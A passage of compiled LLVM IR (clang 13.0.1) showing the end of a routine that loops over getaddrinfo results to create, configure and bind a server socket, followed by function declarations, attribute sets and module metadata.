  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.168, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !22

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.169, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
